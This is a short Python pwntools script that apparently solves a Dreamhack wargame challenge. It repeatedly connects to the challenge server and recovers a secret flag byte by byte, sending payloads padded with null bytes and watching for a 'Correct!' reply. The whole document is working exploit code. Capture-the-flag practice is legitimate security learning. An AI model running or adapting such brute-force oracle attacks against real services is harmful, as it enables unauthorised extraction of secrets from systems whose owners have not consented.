from pwn import *

flag = b"\x00"

for i in range(64):
    for j in range(0x20, 0x7f):
        r = remote("host3.dreamhack.games", 22818)
        payload = (chr(j)*(63-i)).encode() + flag
        payload += b"\x00"*(64-len(payload))
        payload += (chr(j)*(62-i)).encode()
        r.sendafter(b"flag? ", payload)
        if r.recvline()[:-1] == b"Correct!":
            flag = chr(j).encode() + flag
            print(f"pause from {chr(j)}")
            pause()
            break
        elif j == 0x7e:
            flag = b"\x00" + flag
        else: r.close()
    print(flag)